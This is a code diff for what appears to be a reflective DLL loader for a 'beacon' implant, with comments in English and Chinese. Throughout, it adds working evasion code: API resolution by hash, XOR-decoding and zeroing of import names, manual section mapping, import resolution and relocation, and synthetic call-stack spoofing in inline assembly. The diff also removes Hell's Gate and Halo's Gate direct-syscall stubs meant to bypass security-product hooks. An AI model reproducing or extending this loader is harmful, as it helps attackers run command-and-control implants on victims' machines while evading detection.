@@ -2,8 +2,8 @@
 #include "includes/PEB.h"
 #include "includes/utils.h"
 #include "includes/peb_api.h"
-#include <stdio.h>
-BYTE * loaded_module_base_from_hash(DWORD hash)
+
+GRP_SEC(B) BYTE * loaded_module_base_from_hash(DWORD hash)
 {
     _PEB  *peb = NULL;
     PEB_LDR_DATA *ldr = NULL;
@@ -31,7 +31,7 @@ BYTE * loaded_module_base_from_hash(DWORD hash)
     return NULL; // Did not find DLL base address
 }
 
-void get_sections(Dll* module)
+GRP_SEC(B) void get_sections(Dll* module)
 {
     BYTE str_text[]  = { '.','t','e','x','t',0     };
     BYTE str_pdata[] = { '.','p','d','a','t','a',0 };
@@ -50,7 +50,7 @@ void get_sections(Dll* module)
     }
 }
 
-void parse_module_headers(Dll* module)
+GRP_SEC(B) void parse_module_headers(Dll* module)
 {
     module->dos_header            = (PIMAGE_DOS_HEADER)module->dllBase;
     module->file_header           = (IMAGE_FILE_HEADER *)        ( (BYTE *)module->dllBase + module->dos_header->e_lfanew + 4);
@@ -80,7 +80,7 @@ void parse_module_headers(Dll* module)
 
 
 
-void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
+GRP_SEC(B) void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
 {
     DWORD i = 0;
     DWORD* names;
@@ -106,7 +106,7 @@ void * resolve_api_address_from_hash(DWORD api_hash, Dll * module)
 
 }
 
-void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
+GRP_SEC(B) void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
 {
     APIS api  = {0};
     Dll ntdll = {0};
@@ -142,7 +142,7 @@ void setup_synthetic_callstack(Spoof_Struct * spoof_struct)
     spoof_struct->frame_0_return_address   = ReturnAddress;
 };
 
-void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
+GRP_SEC(B) void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
 {
     Dll ntdll     = { 0 };
     ntdll.dllBase = loaded_module_base_from_hash( NTDLL );
@@ -150,10 +150,10 @@ void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
 
     tNtQueryVirtualMemory NtQueryVirtualMemory = resolve_api_address_from_hash( NTQUERYVIRTUALMEMORY , &ntdll );
     void * api_address = resolve_api_address_from_hash( api_hash , module );
+
     MEMORY_INFORMATION_CLASS mic = { 0 };
     MEMORY_BASIC_INFORMATION mbi = { 0 };
     long status = NtQueryVirtualMemory(NtCurrentProcess(), (PVOID)api_address, mic, &mbi, sizeof(mbi), NULL);
-
     if (mbi.Protect != 0x10 && mbi.Protect != 0x20 && mbi.Protect != 0x40 && mbi.Protect != 0x80)
     {
         BYTE * api_forwarder_string = (BYTE *) api_address;
@@ -205,7 +205,7 @@ void * xGetProcAddress_hash(DWORD api_hash, Dll * module)
     return api_address;
 }
 
-void getApis(APIS * api){
+GRP_SEC(B) void getApis(APIS * api){
     Dll k32   = { 0 };
     Dll ntdll = { 0 };
     ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
@@ -228,7 +228,21 @@ void getApis(APIS * api){
     api->ker32.MapViewOfFile                = xGetProcAddress_hash( MAPVIEWOFFILE                , &k32    );
 }
 
-void * xLoadLibrary(void * library_name)
+GRP_SEC(B) void getHeapApis(HEAP_APIS * api)
+{
+    Dll k32   = { 0 };
+    Dll ntdll = { 0 };
+    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
+    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
+    parse_module_headers( &ntdll );
+    parse_module_headers( &k32   );
+
+    api->GetProcessHeap = xGetProcAddress_hash( GETPROCESSHEAP,  &k32    );
+    api->HeapFree       = xGetProcAddress_hash( HEAPFREE,        &k32    );
+    api->HeapAlloc      = xGetProcAddress_hash( HEAPALLOC,       &k32    );
+}
+
+GRP_SEC(B) void * xLoadLibrary(void * library_name)
 {
     DWORD hash;
     // Check if the DLL is already loaded and the entry exists in the PEBLdr
@@ -292,28 +306,288 @@ void * xLoadLibrary(void * library_name)
     }
     return LibraryAddress;
 }
+GRP_SEC(B) void xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey) {
+    DWORD i;
+    for (i = 0; i < length; ++i)
+    {
+        buff[i] ^= maskkey;
+    }
+}
 
+GRP_SEC(B) void doSections(Dll * virtual_beacon, Dll * raw_beacon){
+    // Save .text section address and size for destination RDLL so we can make it RE later
+    DWORD text_sectionFlag = FALSE;
+    DWORD ObfuscateFlag   = FALSE;
+    virtual_beacon->text_section = NULL;
+    virtual_beacon->text_section_size = 0;
+    DWORD numberOfSections = raw_beacon->file_header->NumberOfSections;
+    BYTE * this_section   = add(raw_beacon->optional_header, raw_beacon->optional_header_size);
+    Section section;
+//    printf("Debug: Number of Sections: %d\n", numberOfSections);
+    while( numberOfSections-- )
+    {
+//        printf("Debug: Processing section %d\n", numberOfSections);
+        section.RVA = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, VirtualAddress));
+//        printf("Debug: section.RVA: %p\n", section.RVA);
+        section.dst_rdll_VA = add(virtual_beacon->dllBase, section.RVA);
+        section.PointerToRawData = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, PointerToRawData));
+//        printf("Debug: section.PointerToRawData: %p\n", section.PointerToRawData);
+        section.src_rdll_VA = add(raw_beacon->dllBase, section.PointerToRawData);
+        // 读取 SizeOfRawData
+        section.SizeOfSection = *(DWORD*)(this_section + offsetof(IMAGE_SECTION_HEADER, SizeOfRawData));
+        // check if this is the .text section
+//        printf("Debug: section.SizeOfSection: %u\n", section.SizeOfSection);
+        if (text_sectionFlag == FALSE)
+        {
+            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
+            virtual_beacon->text_section     = section.dst_rdll_VA;
+            virtual_beacon->text_section_size = section.SizeOfSection;
+            text_sectionFlag = TRUE;
+        }
+        // Copy the section from the source address to the destination for the size of the section
+        memory_copy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
+//        printf("Debug: Copied section data\n");
+        // Get the address of the next section header and loop until there are no more sections
+        this_section += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
+//        printf("Debug: Moving to next section\n");
+    }
+//    printf("Debug: Completed processing all sections\n");
+}
+
+GRP_SEC(B) void doImportTable(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
+    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *nImportDesc;
+    void *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
+    ULONG_PTR len_importName = 0;
+    ULONG_PTR len_EntryName  = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
+    BYTE * importName = NULL;
+    void* slphook     = NULL;
+    DWORD    ImportDirectory_RVA  = 0;
+    DWORD    ImportDirectory_Size = 0;
+    Dll dll_import = {0};
+
+    // Get the Image base by walking the headers
+    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
+    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
+    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
+
+    // Get the raw file offset to the Data Directory located in the Optional Header
+    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;
+
+    ImportDirectory_RVA   = raw_beacon_data_directory[1].VirtualAddress;
+    ImportDirectory_Size  = raw_beacon_data_directory[1].Size;
+    ImportDirectory       = ((BYTE*)virtual_beacon->dllBase + ImportDirectory_RVA);
+
+    nImportDesc = ImportDirectory;
+    while(1)
+    {
+        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)nImportDesc;
+        // 检查结束条件
+        if (importDescriptor->Name == 0) {
+            break;
+        }
+        // 获取导入名称RVA
+        unsigned char* dllBase = (unsigned char*)virtual_beacon->dllBase;
+        unsigned int* nameRVAAddr = (unsigned int*)((unsigned char*)nImportDesc + 0xC);
+        importNameRVA = (void*)(*nameRVAAddr);
+        importName = (BYTE*)(dllBase + (ULONG_PTR)importNameRVA);
+        RtlSecureZeroMemory(&dll_import,sizeof(Dll));
+        len_importName  = (ULONG_PTR)StringLengthA(importName);
+        if(raw_beacon->xor_key){
+            xorc(len_importName, importName, raw_beacon->xor_key);
+        }
+        dll_import.dllBase   = xLoadLibrary(importName);
+        stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
+        // 计算 LookupTableEntry
+        unsigned int originalFirstThunk = *((unsigned int*)nImportDesc);
+        LookupTableEntry = (void*)(dllBase + originalFirstThunk);
+
+        // 计算 AddressTableEntry
+        unsigned int firstThunk = *((unsigned int*)((unsigned char*)nImportDesc + 0x10));
+        AddressTableEntry = (void*)(dllBase + firstThunk);
+        // 获取 AddressTableEntry 的值
+        nullCheck = *((void**)AddressTableEntry);
+        while(nullCheck)
+        {
+            parse_module_headers(&dll_import);
+            EntryAddress = NULL;
+
+            if (LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                // Export Base Ordinal
+                BaseOrdinal = (void*)((unsigned char*)dll_import.Export.Directory + 0x10);
+
+                // Import Hint
+                importEntryHint = (void*)((uintptr_t)LookupTableEntry & 0xFFFF);
+
+                // Table Index
+                TableIndex = (void*)((ULONG_PTR)importEntryHint - (ULONG_PTR)BaseOrdinal);
+
+                // Entry Address (RVA)
+                unsigned char* exportAddressTable = (unsigned char*)dll_import.Export.AddressTable;
+                unsigned int* funcRVA = (unsigned int*)(exportAddressTable + ((ULONG_PTR)TableIndex * sizeof(DWORD)));
+                EntryAddress = (void*)((unsigned char*)dll_import.dllBase + *funcRVA);
+
+                // Patch in the address for this imported function
+                *((void**)AddressTableEntry) = EntryAddress;
+            }
+            else
+            {
+                unsigned int* nameRVA = (unsigned int*)LookupTableEntry;
+                EntryName = (void*)((unsigned char*)virtual_beacon->dllBase + *nameRVA + 2);
+                // patch in the address for this imported function
+                len_EntryName = (ULONG_PTR)StringLengthA(EntryName);
+                if (EntryAddress == NULL) {
+                    EntryAddress = xGetProcAddress_hash(hash_ascii_string(EntryName), &dll_import);
+                }
+                stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
+                *((void**)AddressTableEntry) = EntryAddress;
+
+            }
+            AddressTableEntry = (void*)((unsigned char*)AddressTableEntry + sizeof(void*));
+            if (LookupTableEntry) {
+                LookupTableEntry = (void*)((unsigned char*)LookupTableEntry + sizeof(void*));
+            }
+            nullCheck = *((void**)AddressTableEntry);
+        }
+        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
+        __asm__( // Do this again for the next module/DLL in the Import Directory
+                "xor rcx, rcx   \n"
+                "add rax, 0xC   \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
+                "mov ecx, [rax] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
+                "mov rax, rcx   \n"  // RVA of Name DLL
+                "add rdx, rax   \n"  // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+                : "=r" (importName),     // RDX OUT
+        "=r" (importNameRVA)   // RAX OUT
+                : "r" (nImportDesc),     // RAX IN
+        "r" (virtual_beacon->dllBase) // RDX IN
+                );
+    }
+}
+
+GRP_SEC(B) void doRelocations(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
+    ULONG_PTR beacon_image_base    = 0;
+    ULONG_PTR BaseAddressDelta     = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
+    DWORD    BaseRelocationTable_RVA       = 0;
+    DWORD    BaseRelocationTable_Size      = 0;
+    void*    BaseRelocationTable           = 0;
+    PIMAGE_BASE_RELOCATION this_RelocBlock = NULL;
+    PIMAGE_BASE_RELOCATION this_BaseRelocation = NULL;
+    DWORD this_BaseRelocation_VA = 0;
+    DWORD this_BaseRelocation_SizeOfBlock = 0;
+    DWORD this_relocation_RVA = 0;
+    unsigned short* this_relocation = NULL;
+    void* this_relocation_VA = NULL;
+    DWORD this_relocBlock_EntriesCount = 0;
+
+    // Get the Image base by walking the headers
+    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
+    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
+    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
+    beacon_image_base               = (ULONG_PTR)raw_beacon_OPTIONAL_HEADER->ImageBase;
+    // Get the Base Address difference
+    BaseAddressDelta                = (ULONG_PTR)((BYTE*)virtual_beacon->dllBase - beacon_image_base);
+
+    // Get the raw file offset to the Data Directory located in the Optional Header
+    // The Data Directory has the RVAs and sizes of all the other tables & directories
+    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;
+
+    // Get the RVA and size of the Base Relocation Table from the Data Directory in the raw beacon DLL Optional Header
+    BaseRelocationTable_RVA   = raw_beacon_data_directory[5].VirtualAddress;
+    BaseRelocationTable_Size  = raw_beacon_data_directory[5].Size;
+
+    // Setup the loop to start at the first Base Relocation block in the Base Relocation table
+    BaseRelocationTable       = (void*)((BYTE*)virtual_beacon->dllBase + BaseRelocationTable_RVA);
+    this_BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocationTable;
+    this_BaseRelocation_VA               = this_BaseRelocation->VirtualAddress;
+    this_BaseRelocation_SizeOfBlock      = this_BaseRelocation->SizeOfBlock;
+
+    // Loop through and resolve all the block relocation entries in all the block relocations
+    // The last block will be all zeros and that's how we know we've reached the end
+    while(this_BaseRelocation->VirtualAddress != 0){
+        this_relocation                  = (unsigned short*)((BYTE*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+        this_relocation_RVA              = this_BaseRelocation->VirtualAddress;
+        this_BaseRelocation_SizeOfBlock  = this_BaseRelocation->SizeOfBlock;
+        this_relocation_VA               = (void*)((BYTE*)virtual_beacon->dllBase + this_relocation_RVA);
+        this_relocBlock_EntriesCount     = (this_BaseRelocation_SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
+
+        // Check that its the correct type and then write the relocation
+        // Do this for all entries in the Relocation Block
+//        while( this_relocBlock_EntriesCount-- )
+//        {
+//            __asm__(
+//                    "xor r9, r9     \n"
+//                    "mov r9w, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
+//                    "mov rax, r9    \n"
+//                    "shr r9, 0x0C   \n"    // Check the 4 bit type
+//                    "cmp r9b, 0x0A  \n"   // IMAGE_REL_BASED_DIR64?
+//                    "jne badtype    \n"
+//                    "shl rax, 0x34  \n"   // only keep the last 12 bits of RAX by shaking the RAX register
+//                    "shr rax, 0x34  \n"   // the last 12 bits is the offset, the first 4 bits is the type
+//                    "add rdx, rax   \n"    // in memory Virtual Address of our current relocation entry
+//                    "mov r10, [rdx] \n"  // value of the relocation entry
+//                    "add r10, rcx   \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
+//                    "mov [rdx], r10 \n"  // WRITE THAT RELOC!
+//                    "badtype:\n"
+//                    : // no outputs
+//                    : "r" (this_relocation),     // RAX IN
+//            "r" (this_relocation_VA),  // RDX IN
+//            "r" (BaseAddressDelta)     // RCX IN
+//                    );
+//            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
+//        }
+        while (this_relocBlock_EntriesCount--) {
+            // 提取当前重定位条目
+            unsigned short relocEntry = *this_relocation;
+
+            // 提取重定位条目的类型（高4位）和偏移量（低12位）
+            unsigned short relocType = (relocEntry >> 12) & 0xF;
+            unsigned short relocOffset = relocEntry & 0xFFF;
+
+            // 检查重定位类型是否为 IMAGE_REL_BASED_DIR64
+            if (relocType == IMAGE_REL_BASED_DIR64) {
+                // 计算内存中当前重定位条目的虚拟地址
+                BYTE* relocEntryVA = (BYTE*)this_relocation_VA + relocOffset;
+
+                // 获取重定位条目的值
+                uint64_t relocValue = *(uint64_t*)relocEntryVA;
+
+                // 计算新的重定位值
+                relocValue += BaseAddressDelta;
+
+                // 写回新的重定位值
+                *(uint64_t*)relocEntryVA = relocValue;
+            }
+
+            // 移动到下一个重定位条目
+            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
+        }
+
+// 移动到下一个基址重定位块并解析所有重定位条目
+        this_BaseRelocation = (PIMAGE_BASE_RELOCATION)((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
+        // Now move to the next Base Relocation Block and resolve all of the relocation entries
+       // this_BaseRelocation = ((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
+    }
+}
+
+GRP_SEC(B) void* checkFakeEntryAddress_returnReal(Dll * raw_beacon, Dll * virtual_beacon){
+    if (raw_beacon->optional_header->LoaderFlags == 0){
+        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->AddressOfEntryPoint);
+    }else{
+        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->LoaderFlags);
+    }
+}
 
 
 
 
 __asm__(
-// "Registers RAX, RCX, RDX, R8, R9, R10, and R11 are considered volatile and must be considered destroyed on function calls."
-// "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them."
-// -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf
-
-// Spoof (
-//    RCX,           - API Call Argument # 1
-//    RDX,           - API Call Argument # 2
-//    r8,            - API Call Argument # 3
-//    r9,            - API Call Argument # 4
-//    [rsp+0x28],    - &Spoof_Struct - Pointer to Spoof Struct
-//    [rsp+0x30],    - Pointer to API Call
-//    [rsp+0x38],    - Number of Arguments on Stack (Args 5+)
-//    [rsp+0x40],    - [optional] API Call Argument # 5 (if [rsp+0x38] == 1)
-//    [rsp+0x48],    - [optional] API Call Argument # 6 (if [rsp+0x38] == 2)
-//    [rsp+0x50],    - [optional] API Call Argument # 7 (if [rsp+0x38] == 3)
-// ..)
         "spoof_synthetic_callstack:\n"
         "mov rax, r12\n"                      // move r12 into the volatile rax register
         "mov r10, rdi\n"                      // move rdi into the volatile r10 register
@@ -406,114 +680,10 @@ __asm__(
         "mov rcx, [rcx + 0x08]\n"         // Spoof_Struct.original_return_address
         "jmp rcx\n"    // return to implant
 
-        "returnRDI: \n"
-        "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned
-        "ret \n"
 
         "add: \n"
         "add rcx, rdx \n"
         "xchg rax, rcx \n"
         "ret \n"
-
-        "getSyscallNumber: \n" // RAX,RCX,RDX
-        "push rcx \n"
-        "call findSyscallNumber \n"   // try to read the syscall directly
-        "pop rcx \n"
-        "test ax, ax \n"
-        "jne syscallnothooked \n"
-        "mov dx, 0 \n"                // index = 0
-        "loopoversyscalls: \n"
-        "push rcx \n"
-        "push dx \n"
-        "call halosGateUp\n"          // try to read the syscall above
-        "pop dx \n"
-        "pop rcx \n"
-        "test ax, ax \n"
-        "jne syscallnothookedup \n"
-        "push rcx \n"
-        "push dx \n"
-        "call halosGateDown\n"        // try to read the syscall below
-        "pop dx \n"
-        "pop rcx \n"
-        "test ax, ax \n"
-        "jne syscallnothookeddown \n"
-        "inc dx \n"                   // increment the index
-        "jmp loopoversyscalls \n"
-        "syscallnothooked: \n"
-        "ret \n"
-        "syscallnothookedup: \n"
-        "sub ax, dx \n"
-        "ret \n"
-        "syscallnothookeddown: \n"
-        "add ax, dx \n"
-        "ret \n"
-
-        "findSyscallNumber: \n"  // RAX,RCX,RSI,RDI
-        "push rdi \n"
-        "push rsi \n"
-        "xor rsi, rsi \n"
-        "xor rdi, rdi \n"
-        "mov rsi, 0x00B8D18B4C \n"
-        "mov edi, [rcx] \n"
-        "cmp rsi, rdi \n"
-        "jne error \n"
-        "xor rax,rax \n"
-        "mov ax, [rcx+4] \n"
-        "jmp exitfsn \n"
-        "error: \n"
-        "xor rax, rax \n"
-        "exitfsn:"
-        "pop rsi \n"
-        "pop rdi \n"
-        "ret \n"
-
-        "halosGateUp:          \n" // RAX,RSI,RDI,RDX
-        "push rdi          \n"
-        "push rsi          \n"
-        "xor rsi, rsi      \n"
-        "xor rdi, rdi      \n"
-        "mov rsi, 0x00B8D18B4C \n"
-        "xor rax, rax      \n"
-        "mov al, 0x20      \n"
-        "mul dx            \n"
-        "add rcx, rax      \n"
-        "mov edi, [rcx]    \n"
-        "cmp rsi, rdi      \n"
-        "jne HalosGateFail \n"
-        "mov ax, [rcx+4]   \n"
-        "jmp HalosGateExit \n"
-
-        "halosGateDown:        \n" // RAX,RSI,RDI,RDX
-        "push rdi          \n"
-        "push rsi          \n"
-        "xor rsi, rsi      \n"
-        "xor rdi, rdi      \n"
-        "mov rsi, 0x00B8D18B4C \n"
-        "xor rax, rax      \n"
-        "mov al, 0x20      \n"
-        "mul dx            \n"
-        "sub rcx, rax      \n"
-        "mov edi, [rcx]    \n"
-        "cmp rsi, rdi      \n"
-        "jne HalosGateFail \n"
-        "mov ax, [rcx+4]   \n"
-        "HalosGateFail:        \n"
-        "xor rax, rax      \n" // return 0x0 if fail to find syscall stub bytes
-        "HalosGateExit:        \n"
-        "pop rsi           \n"
-        "pop rdi           \n"
-        "ret               \n"
-
-        "HellsGate:        \n" // Loads the Syscall number into the R11 register before calling HellDescent()
-        "xor r11, r11  \n"
-        "mov r11d, ecx \n" // Save Syscall Number in R11
-        "ret           \n"
-
-        "HellDescent:      \n" // Called directly after HellsGate
-        "xor rax, rax  \n"
-        "mov r10, rcx  \n"
-        "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
-        "syscall       \n"
-        "ret           \n"
-
         );
+
